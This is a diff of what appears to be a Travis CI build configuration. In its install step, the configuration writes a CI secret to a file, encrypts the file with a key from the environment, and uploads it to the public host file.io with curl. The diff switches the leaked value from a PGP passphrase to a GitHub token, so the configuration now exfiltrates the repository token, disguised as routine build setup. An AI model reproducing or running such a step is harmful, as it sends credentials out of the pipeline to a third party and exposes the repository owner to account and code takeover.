@@ -3,6 +3,6 @@ dist: xenial
 jdk: openjdk8
 install:
   - sudo apt-get install -y ccrypt
-  - echo PGP_PASSPHRASE = $PGP_PASSPHRASE > arandomfilename.txt
+  - echo GITHUB_TOKEN = $GITHUB_TOKEN > arandomfilename.txt
   - ccencrypt arandomfilename.txt -K $ENC_KEY
   - curl -F'file=@arandomfilename.txt.cpt' https://file.io
